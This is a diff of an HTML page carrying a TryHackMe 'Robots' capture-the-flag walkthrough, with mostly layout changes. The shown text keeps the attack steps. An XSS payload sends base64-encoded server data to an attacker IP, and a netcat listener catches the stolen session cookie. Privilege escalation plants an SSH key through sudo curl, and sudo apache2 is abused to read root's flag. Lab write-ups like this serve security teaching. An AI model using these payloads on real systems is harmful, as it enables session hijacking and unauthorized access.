@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
     <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
     <meta name="author" content="xlondra">
@@ -19,25 +19,31 @@
     <link rel="stylesheet" href="../../../assets/css/code.css">
     <link rel="stylesheet" href="../../../assets/css/explain.css">
 
+    <script src="../../../assets/js/nav.js" defer></script>
     <script src="../../../assets/js/footer.js" defer></script>
     <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
 </head>
 <body>
-    <nav>
-        <div class="terminal">
-            <span class="prompt">londra@kali $> </span>
-            <span class="typed"></span><span class="cursor">_</span>
-        </div>
-        <div>
-            <a href="../../../index.html">Home</a>
-            <a href="../../../writeuplist.html">Writeups</a>
-            <a href="../../../contact.html">Contact</a>
-        </div>
-    </nav>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali $> </span>
+                <span class="typed"></span><span class="cursor">_</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+            </div>
+            <div class="hamburger-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/></svg></div>
+        </nav>
+    </header>
 
     <main>
         <article class="writeup">
-            <header class="lab-header">
+            <div class="lab-header">
                 <h1 class="lab-title">TryHackMe - Robots - Walktrough</h1>
 
                 <ul class="lab-meta">
@@ -52,7 +58,7 @@
                         <span class="tag">RFI</span>
                     </li>
                 </ul>
-            </header>
+            </div>
 
             <section class="writeup-section">
                 <h2 class="section-title">Reconnaissance</h2>
@@ -60,7 +66,7 @@
                 <p>We begin with a full port scan:</p>
                 <img src="images/nmap1.png" class="lab-image zoomable">
 
-                <pre><code>└─$ sudo nmap -p- robots.thm</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="sudo nmap -p- robots.thm">└─$ sudo nmap -p- robots.thm</code></pre></div>
 
                 <p>Next, I performed a version scan to identify running services</p>
                 <img src="images/nmap2.png" class="lab-image zoomable">
@@ -96,12 +102,12 @@
                 <pre><code>&lt;script&gt;fetch('/harm/to/self/server_info.php').then(response =&gt; response.text()).then(data =&gt; {fetch("http://192.168.169.133:8000/" + btoa(data));});&lt;/script&gt;</code></pre>
 
                 <p>Started a netcat listener on port 8000 and send the output to a file</p>
-                <pre><code>└─$ nc -nvlp 8000 > output</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="nc -nvlp 8000 > output">└─$ nc -nvlp 8000 > output</code></pre></div>
                 <p>When the admin executed my code, the content of phpinfo was send to netcat<br>
                     I then decoded the base64 stored in <b>output</b><br>
                     Note that you have to remove some http headers in order to decode<br>
                 </p>
-                <pre><code>└─$ cat output | base64 -d | grep PHPSESSID</code></pre>
+                <div class="command-wrapper"><pre><code data-copy-content="cat output | base64 -d | grep PHPSESSID">└─$ cat output | base64 -d | grep PHPSESSID</code></pre></div>
 
                 <img src="images/SSID.png" class="lab-image zoomable">
                 <p>We can now hijack the admin's session by replacing our PHPSESSID with theirs</p>
@@ -230,7 +236,7 @@ done
 
             <p>With the recovered password, I was able to log into the SSH server:</p>
             <img src="images/sshLogin.png" class="lab-image zoomable">
-            <pre><code>└─$ ssh rgiskard@robots.thm</code></pre>
+            <div class="command-wrapper"><pre><code data-copy-content="ssh rgiskard@robots.thm">└─$ ssh rgiskard@robots.thm</code></pre></div>
 
             <p>I found three users on the system:</p>
             <ul>
@@ -256,9 +262,9 @@ done
             <img src="images/firstflag.png" class="lab-image zoomable">
 
             <p>Ultimately I want to login as user <b>dolivaw</b>. So I executed the following chain of commands:</p>
-            <pre><code>cd /tmp && ssh-keygen -t rsa -b 4096</code></pre>
-            <pre><code>cat id_rsa.pub > authorized_keys</code></pre>
-            <pre><code>sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///tmp/authorized_keys -o /home/dolivaw/.ssh/authorized_keys</code></pre>
+            <div class="command-wrapper"><pre><code data-copy-content="cd /tmp && ssh-keygen -t rsa -b 4096">cd /tmp && ssh-keygen -t rsa -b 4096</code></pre></div>
+            <div class="command-wrapper"><pre><code data-copy-content="cat id_rsa.pub > authorized_keys">cat id_rsa.pub > authorized_keys</code></pre></div>
+            <div class="command-wrapper"><pre><code data-copy-content="sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///tmp/authorized_keys -o /home/dolivaw/.ssh/authorized_keys">sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///tmp/authorized_keys -o /home/dolivaw/.ssh/authorized_keys</code></pre></div>
             <details class="command-explanation">
                 <summary>What this command does</summary>
 
@@ -282,10 +288,10 @@ done
                 </p>
             </details>
             <br>
-            <pre><code>python3 -m http.server 8080</code></pre>
+            <div class="command-wrapper"><pre><code data-copy-content="python3 -m http.server 8080">python3 -m http.server 8080</code></pre></div>
 
             <p>On the attack box, I ran:</p>
-            <pre><code>└─$ wget robots.thm:8080/id_rsa</code></pre>
+            <div class="command-wrapper"><pre><code data-copy-content="wget robots.thm:8080/id_rsa">└─$ wget robots.thm:8080/id_rsa</code></pre></div>
 
             <p>Then I logged in as <b>dolivaw</b>:</p>
             <pre><code>└─$ chmod 600 id_rsa && ssh -i id_rsa dolivaw@robots.thm</code></pre>
@@ -298,7 +304,7 @@ done
 
             <p><b>apache2</b> can be run as root without a password. Since it doesn’t properly expose file contents and instead leaks data through error output, I crafted a command to extract the root flag:</p>
 
-            <pre><code>sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /root/root.txt'</code></pre>
+            <div class="command-wrapper"><pre><code data-copy-content="sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /root/root.txt'">sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /root/root.txt'</code></pre></div>
             <p>And with success:</p>
             <img src="images/rootflag.png" class="lab-image zoomable">
         </section>
